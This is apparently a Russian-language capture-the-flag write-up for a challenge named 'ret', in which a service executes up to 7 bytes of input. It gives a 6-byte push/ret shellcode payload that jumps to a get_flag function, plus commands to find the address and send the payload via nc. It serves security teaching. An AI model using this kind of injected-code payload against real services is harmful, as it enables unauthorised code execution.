# ret — writeup

## Идея
Сервис читает до 7 байт и **исполняет** их как код.

В бинаре есть функция `get_flag()`, которая печатает флаг.

Задача: за 7 байт передать управление в `get_flag()`.

## Решение
На x86-64 (без PIE) адрес `get_flag` обычно выглядит как `0x401xxx` и помещается в 32-битное значение.

Самый компактный способ (6 байт):

- `push imm32` (5 байт)
- `ret` (1 байт)

Это положит адрес на стек и сделает переход.

## Шаги
1) Найти адрес `get_flag`:

```bash
nm -n ret | awk '$3=="get_flag"{print "0x"$1; exit}'
# или
objdump -d ret | grep -n 'get_flag'
```

2) Сформировать payload:

```python
import struct
payload = b'\x68' + struct.pack('<I', addr & 0xffffffff) + b'\xc3'
```

3) Отправить:

```bash
python3 - <<'PY' | nc <host> <port>
import sys, struct
addr = int('<GET_FLAG_ADDR>', 16)
sys.stdout.buffer.write(b'\x68' + struct.pack('<I', addr & 0xffffffff) + b'\xc3')
PY
```
